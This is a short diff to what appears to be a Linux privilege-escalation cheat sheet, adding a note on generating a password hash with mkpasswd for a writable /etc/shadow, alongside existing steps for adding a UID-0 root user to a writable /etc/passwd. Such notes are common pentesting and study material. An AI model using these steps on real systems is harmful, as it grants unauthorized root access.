@@ -316,6 +316,8 @@ choice.
  - Once you've done this, you can save the file with the ".sh" extension. 
  - Then make the file executable using the command "chmod +x FILENAME.sh".
  
+ ### Writable /etc/shadow
+ - mkpasswd -m sha-512 newpasswordhere - Generate a new password hash 
  ### Editing writable /etc/passwd
  - create hash  "openssl passwd -1 -salt [salt] [password]"
  - in /etc/passwd add username:passwordhash:0:0:root:/root:/bin/bash
